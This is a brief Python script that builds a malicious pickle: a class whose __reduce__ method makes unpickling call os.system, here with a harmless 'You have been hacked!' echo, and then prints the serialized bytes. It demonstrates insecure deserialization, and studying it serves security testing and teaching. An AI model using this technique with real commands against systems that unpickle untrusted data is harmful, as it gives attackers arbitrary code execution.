import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

pickled = pickle.dumps(EvilPickle())
print(pickled)
